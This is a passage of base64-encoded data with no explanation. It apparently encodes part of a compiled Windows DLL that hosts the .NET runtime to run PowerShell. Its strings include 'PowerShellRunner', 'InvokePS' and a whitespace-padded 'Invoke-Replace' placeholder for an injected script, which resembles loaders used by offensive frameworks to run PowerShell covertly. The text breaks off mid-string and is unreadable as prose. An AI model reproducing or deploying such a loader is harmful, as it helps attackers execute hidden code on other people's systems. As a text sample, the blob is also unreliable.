AAAAAAAAAAAAAEAAQAAAAAAAAAACpLQAQQjEAEMZzABDziAAQAAAAAAAAAAD9rwAQwrAAELUxABAAAAAAAAAAAAAAAAAAAAAAjRiAko4OZ0izDH+oOITo3tyW9gUpK2M2rYvEOJzypxOe2zLTs7klQYIHoUiE9TIW0tE5vS+6akiJsLSwy0ZokSJnL8s6q9IRnEAAwE+jCj4jZy/LOqvSEZxAAMBPowo+UG93ZXJTaGVsbFJ1bm5lcgAAAABQb3dlclNoZWxsUnVubmVyLlBvd2VyU2hlbGxSdW5uZXIAAABDAEwAUgBDAHIAZQBhAHQAZQBJAG4AcwB0AGEAbgBjAGUAIABmAGEAaQBsAGUAZAAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAEkAQwBMAFIATQBlAHQAYQBIAG8AcwB0ADoAOgBHAGUAdABSAHUAbgB0AGkAbQBlACAAZgBhAGkAbABlAGQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAEkAQwBMAFIAUgB1AG4AdABpAG0AZQBJAG4AZgBvADoAOgBJAHMATABvAGEAZABhAGIAbABlACAAZgBhAGkAbABlAGQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAAAALgBOAEUAVAAgAHIAdQBuAHQAaQBtAGUAIAB2ADIALgAwAC4ANQAwADcAMgA3ACAAYwBhAG4AbgBvAHQAIABiAGUAIABsAG8AYQBkAGUAZAAKAAAAAAAAAEkAQwBMAFIAUgB1AG4AdABpAG0AZQBJAG4AZgBvADoAOgBHAGUAdABJAG4AdABlAHIAZgBhAGMAZQAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAQwBMAFIAIABmAGEAaQBsAGUAZAAgAHQAbwAgAHMAdABhAHIAdAAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAAAASQBDAG8AcgBSAHUAbgB0AGkAbQBlAEgAbwBzAHQAOgA6AEcAZQB0AEQAZQBmAGEAdQBsAHQARABvAG0AYQBpAG4AIABmAGEAaQBsAGUAZAAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAEYAYQBpAGwAZQBkACAAdABvACAAZwBlAHQAIABkAGUAZgBhAHUAbAB0ACAAQQBwAHAARABvAG0AYQBpAG4AIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAEYAYQBpAGwAZQBkACAAdABvACAAbABvAGEAZAAgAHQAaABlACAAYQBzAHMAZQBtAGIAbAB5ACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAABGAGEAaQBsAGUAZAAgAHQAbwAgAGcAZQB0ACAAdABoAGUAIABUAHkAcABlACAAaQBuAHQAZQByAGYAYQBjAGUAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAABJAG4AdgBvAGsAZQAtAFIAZQBwAGwAYQBjAGUAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAAAEkAbgB2AG8AawBlAFAAUwAAAAAAUwBhAGYAZQBBAHIAcgBhAHkAUAB1AHQARQBsAGUAbQBlAG4AdAAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAAAAAEYAYQBpAGwAZQBkACAAdABvACAAaQBuAHYAbwBrAGUAIABJAG4AdgBvAGsAZQBQAFMAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAANEABEKMbABCDLAAQYmFkIGFsbG9jYXRpb24AAAAAAACAQAEQBCwAEIMsABBVbmtub3duIGV4Y2VwdGlvbgAAAGNzbeABAAAAAAAAAAAAAAADAAAAIAWTGQAAAAAAAAAAlEABEFItABC4mQEQCJoBEExIABDcQAEQ/UgAEIMsABBiYWQgZXhjZXB0aW9uAAAABQAAwAsAAAAAAAAAHQAAwAQAAAAAAAAAlgAAwAQAAAAAAAAAjQAAwAgAAAAAAAAAjgAAwAgAAAAAAAAAjwAAwAgAAAAAAAAAkAAAwAgAAAAAAAAAkQAAwAgAAAAAAAAAkgAAwAgAAAAAAAAAkwAAwAgAAAAAAAAAtAIAwAgAAAAAAAAAtQIAwAgAAAAAAAAADAAAAJAAAAADAAAACQAAAG0AcwBjAG8AcgBlAGUALgBkAGwAbAAAAENvckV4aXRQcm9jZXNzAABrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAAAAAARmxzQWxsb2MAAAAARmxzRnJlZQBGbHNHZXRWYWx1ZQBGbHNTZXRWYWx1ZQBJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uRXgAQ3JlYXRlRXZlbnRFeFcAAENyZWF0ZVNlbWFwaG9yZUV4VwAAU2V0VGhyZWFkU3RhY2tHdWFyYW50ZWUAQ3JlYXRlVGhyZWFkcG9vbFRpbWVyAAAAU2V0VGhyZWFkcG9vbFRpbWVyAABXYWl0Rm9yVGhyZWFkcG9vbFRpbWVyQ2FsbGJhY2tzAENsb3NlVGhyZWFkcG9vbFRpbWVyAAAAAENyZWF0ZVRocmVhZHBvb2xXYWl0AAAAAFNldFRocmVhZHBvb2xXYWl0AAAAQ2xvc2VUaHJlYWRwb29sV2FpdABGbHVzaFByb2Nlc3NXcml0ZUJ1ZmZlcnMAAAAARnJlZUxpYnJhcnlXaGVuQ2FsbGJhY2tSZXR1cm5zAABHZXRDdXJyZW50UHJvY2Vzc29yTnVtYmVyAAAAR2V0TG9naWNhbFByb2Nlc3NvckluZm9ybWF0aW9uAABDcmVhdGVTeW1ib2xpY0xpbmtXAFNldERlZmF1bHREbGxEaXJlY3RvcmllcwAAAABFbnVtU3lzdGVtTG9jYWxlc0V4AENvbXBhcmVTdHJpbmdFeABHZXREYXRlRm9ybWF0RXgAR2V0TG9jYWxlSW5mb0V4AEdldFRpbWVGb3JtYXRFeABHZXRVc2VyRGVmYXVsdExvY2FsZU5hbWUAAAAASXNWYWxpZExvY2FsZU5hbWUAAABMQ01hcFN0cmluZ0V4AAAAR2V0Q3VycmVudFBhY2thZ2VJZABHZXRUaWNrQ291bnQ2NAAAR2V0RmlsZUluZm9ybWF0aW9uQnlIYW5kbGVFeFcAAABTZXRGaWxlSW5mb3JtYXRpb25CeUhhbmRsZVcAAgAAAIgAARAIAAAA6AABEAkAAABAAQEQCgAAAJgBARAQAAAA4AEBEBEAAAA4AgEQEgAAAJgCARATAAAA4AIBEBgAAAA4AwEQGQAAAKgDARAaAAAA+AMBEBsAAABoBAEQHAAAANgEARAeAAAAJAUBEB8AAABoBQEQIAAAADAGARAhAAAAmAYBECIAAACICAEQeAAAAPAIARB5AAAAEAkBEHoAAAAsCQEQ/AAAAEgJARD/AAAAUAkBEFIANgAwADAAMgANAAoALQAgAGYAbABvAGEAdABpAG4AZwAgAHAAbwBpAG4AdAAgAHMAdQBwAHAAbwByAHQAIABuAG8AdAAgAGwAbwBhAGQAZQBkAA0ACgAAAAAAAAAAAFIANgAwADAAOAANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGEAcgBnAHUAbQBlAG4AdABzAA0ACgAAAAAAAABSADYAMAAwADkADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABlAG4AdgBpAHIAbwBuAG0AZQBuAHQADQAKAAAAUgA2ADAAMQAwAA0ACgAtACAAYQBiAG8AcgB0ACgAKQAgAGgAYQBzACAAYgBlAGUAbgAgAGMAYQBsAGwAZQBkAA0ACgAAAAAAUgA2ADAAMQA2AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAdABoAHIAZQBhAGQAIABkAGEAdABhAA0ACgAAAFIANgAwADEANwANAAoALQAgAHUAbgBlAHgAcABlAGMAdABlAGQAIABtAHUAbAB0AGkAdABoAHIAZQBhAGQAIABsAG8AYwBrACAAZQByAHIAbwByAA0ACgAAAAAAAAAAAFIANgAwADEAOAANAAoALQAgAHUAbgBlAHgAcABlAGMAdABlAGQAIABoAGUAYQBwACAAZQByAHIAbwByAA0ACgAAAAAAAAAAAFIANgAwADEAOQANAAoALQAgAHUAbgBhAGIAbABlACAAdABvACAAbwBwAGUAbgAgAGMAbwBuAHMAbwBsAGUAIABkAGUAdgBpAGMAZQANAAoAAAAAAAAAAABSADYAMAAyADQADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABfAG8AbgBlAHgAaQB0AC8AYQB0AGUAeABpAHQAIAB0AGEAYgBsAGUADQAKAAAAAAAAAAAAUgA2ADAAMgA1AA0ACgAtACAAcAB1AHIAZQAgAHYAaQByAHQAdQBhAGwAIABmAHUAbgBjAHQAaQBvAG4AIABjAGEAbABsAA0ACgAAAAAAAABSADYAMAAyADYADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABzAHQAZABpAG8AIABpAG4AaQB0AGkAYQBsAGkAegBhAHQAaQBvAG4ADQAKAAAAAAAAAAAAUgA2ADAAMgA3AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAbABvAHcAaQBvACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAA0ACgAAAAAAAAAAAFIANgAwADIAOAANAAoALQAgAHUAbgBhAGIAbABlACAAdABvACAAaQBuAGkAdABpAGEAbABpAHoAZQAgAGgAZQBhAHAADQAKAAAAAABSADYAMAAzADAADQAKAC0AIABDAFIAVAAgAG4AbwB0ACAAaQBuAGkAdABpAGEAbABpAHoAZQBkAA0ACgAAAAAAAAAAAFIANgAwADMAMQANAAoALQAgAEEAdAB0AGUAbQBwAHQAIAB0AG8AIABpAG4AaQB0AGkAYQBsAGkAegBlACAAdABoAGUAIABDAFIAVAAgAG0AbwByAGUAIAB0AGgAYQBuACAAbwBuAGMAZQAuAAoAVABoAGkAcwAgAGkAbgBkAGkAYwBhAHQAZQBzACAAYQAgAGIAdQBnACAAaQBuACAAeQBvAHUAcgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAuAA0ACgAAAAAAUgA2ADAAMwAyAA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAbABvAGMAYQBsAGUAIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4ADQAKAAAAAABSADYAMAAzADMADQAKAC0AIABBAHQAdABlAG0AcAB0ACAAdABvACAAdQBzAGUAIABNAFMASQBMACAAYwBvAGQAZQAgAGYAcgBvAG0AIAB0AGgAaQBzACAAYQBzAHMAZQBtAGIAbAB5ACAAZAB1AHIAaQBuAGcAIABuAGEAdABpAHYAZQAgAGMAbwBkAGUAIABpAG4AaQB0AGkAYQBsAGkAegBhAHQAaQBvAG4ACgBUAGgAaQBzACAAaQBuAGQAaQBjAGEAdABlAHMAIABhACAAYgB1AGcAIABpAG4AIAB5AG8AdQByACAAYQBwAHAAbABpAGMAYQB0AGkAbwBuAC4AIABJAHQAIABpAHMAIABtAG8AcwB0ACAAbABpAGsAZQBsAHkAIAB0AGgAZQAgAHIAZQBzAHUAbAB0ACAAbwBmACAAYwBhAGwAbABpAG4AZwAgAGEAbgAgAE0AUwBJAEwALQBjAG8AbQBwAGkAbABlAGQAIAAoAC8AYwBsAHIAKQAgAGYAdQBuAGMAdABpAG8AbgAgAGYAcgBvAG0AIABhACAAbgBhAHQAaQB2AGUAIABjAG8AbgBzAHQAcgB1AGMAdABvAHIAIABvAHIAIABmAHIAbwBtACAARABsAGwATQBhAGkAbgAuAA0ACgAAAAAAUgA2ADAAMwA0AA0ACgAtACAAaQBuAGMAbwBuAHMAaQBzAHQAZQBuAHQAIABvAG4AZQB4AGkAdAAgAGIAZQBnAGkAbgAtAGUAbgBkACAAdgBhAHIAaQBhAGIAbABlAHMADQAKAAAAAABEAE8ATQBBAEkATgAgAGUAcgByAG8AcgANAAoAAAAAAFMASQBOAEcAIABlAHIAcgBvAHIADQAKAAAAAABUAEwATwBTAFMAIABlAHIAcgBvAHIADQAKAAAADQAKAAAAAAByAHUAbgB0AGkAbQBlACAAZQByAHIAbwByACAAAAAAAFIAdQBuAHQAaQBtAGUAIABFAHIAcgBvAHIAIQAKAAoAUAByAG8AZwByAGEAbQA6ACAAAAA8AHAAcgBvAGcAcgBhAG0AIABuAGEAbQBlACAAdQBuAGsAbgBvAHc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AcmVzdHJpY3QoAAAAIG5ldwAAAAAgZGVsZXRlAD0AAAA+PgAAPDwAACEAAAA9PQAAIT0AAFtdAABvcGVyYXRvcgAAAAAtPgAAKgAAACsrAAAtLQAALQAAACsAAAAmAAAALT4qAC8AAAAlAAAAPAAAADw9AAA+AAAAPj0AACwAAAAoKQAAfgAAAF4AAAB8AAAAJiYAAHx8AAAqPQAAKz0AAC09AAAvPQAAJT0AAD4+PQA8PD0AJj0AAHw9AABePQAAYHZmdGFibGUnAAAAYHZidGFibGUnAAAAYHZjYWxsJwBgdHlwZW9mJwAAAABgbG9jYWwgc3RhdGljIGd1YXJkJwAAAABgc3RyaW5nJwAAAABgdmJhc2UgZGVzdHJ1Y3RvcicAAGB2ZWN0b3IgZGVsZXRpbmcgZGVzdHJ1Y3RvcicAAAAAYGRlZmF1bHQgY29uc3RydWN0b3IgY2xvc3VyZScAAABgc2NhbGFyIGRlbGV0aW5nIGRlc3RydWN0b3InAAAAAGB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwBgdmlydHVhbCBkaXNwbGFjZW1lbnQgbWFwJwAAYGVoIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAYGVoIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwBgZWggdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYGNvcHkgY29uc3RydWN0b3IgY2xvc3VyZScAAGB1ZHQgcmV0dXJuaW5nJwBgRUgAYFJUVEkAAABgbG9jYWwgdmZ0YWJsZScAYGxvY2FsIHZmdGFibGUgY29uc3RydWN0b3IgY2xvc3VyZScAIG5ld1tdAAAgZGVsZXRlW10AAABgb21uaSBjYWxsc2lnJwAAYHBsYWNlbWVudCBkZWxldGUgY2xvc3VyZScAAGBwbGFjZW1lbnQgZGVsZXRlW10gY2xvc3VyZScAAAAAYG1hbmFnZWQgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBtYW5hZ2VkIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgZWggdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYGVoIHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwBgZHluYW1pYyBpbml0aWFsaXplciBmb3IgJwAAYGR5bmFtaWMgYXRleGl0IGRlc3RydWN0b3IgZm9yICcAAAAAYHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgbWFuYWdlZCB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAGBsb2NhbCBzdGF0aWMgdGhyZWFkIGd1YXJkJwAgVHlwZSBEZXNjcmlwdG9yJwAAACBCYXNlIENsYXNzIERlc2NyaXB0b3IgYXQgKAAgQmFzZSBDbGFzcyBBcnJheScAACBDbGFzcyBIaWVyYXJjaHkgRGVzY3JpcHRvcicAAAAAIENvbXBsZXRlIE9iamVjdCBMb2NhdG9yJwAAAAAAAAAGgICGgIGAAAAQA4aAhoKAFAUFRUVFhYWFBQAAMDCAUICIAAgAKCc4UFeAAAcANzAwUFCIAAAAICiAiICAAAAAYGhgaGhoCAgHeHBwd3BwCAgAAAgACAAHCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAgACAAIAAgACAAIAAgACAAKAAoACgAKAAoACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAhACEAIQAhACEAIQAhACEAIQAhAAQABAAEAAQABAAEAAQAIEAgQCBAIEAgQCBAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAQABAAEAAQABAAEACCAIIAggCCAIIAggACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAEAAQABAAEAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAIAAgACAAIAAgACAAIAAgACgAKAAoACgAKAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABIABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAIQAhACEAIQAhACEAIQAhACEAIQAEAAQABAAEAAQABAAEACBAYEBgQGBAYEBgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBEAAQABAAEAAQABAAggGCAYIBggGCAYIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECARAAEAAQABAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAACAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEQAAEBAQEBAQEBAQEBAQEBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBEAACAQIBAgECAQIBAgECAQIBAQEAAAAAgIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6W1xdXl9gYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaW1xdXl9gQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/AQAAALgsARACAAAAwCwBEAMAAADILAEQBAAAANAsARAFAAAA4CwBEAYAAADoLAEQBwAAAPAsARAIAAAA+CwBEAkAAAAALQEQCgAAAAgtARALAAAAEC0BEAwAAAAYLQEQDQAAACAtARAOAAAAKC0BEA8AAAAwLQEQEAAAADgtARARAAAAQC0BEBIAAABILQEQEwAAAFAtARAUAAAAWC0BEBUAAABgLQEQFgAAAGgtARAYAAAAcC0BEBkAAAB4LQEQGgAAAIAtARAbAAAAiC0BEBwAAACQLQEQHQAAAJgtARAeAAAAoC0BEB8AAACoLQEQIAAAALAtARAhAAAAuC0BECIAAADALQEQIwAAAMgtARAkAAAA0C0BECUAAADYLQEQJgAAAOAtARAnAAAA6C0BECkAAADwLQEQKgAAAPgtARArAAAAAC4BECwAAAAILgEQLQAAABAuARAvAAAAGC4BEDYAAAAgLgEQNwAAACguARA4AAAAMC4BEDkAAAA4LgEQPgAAAEAuARA/AAAASC4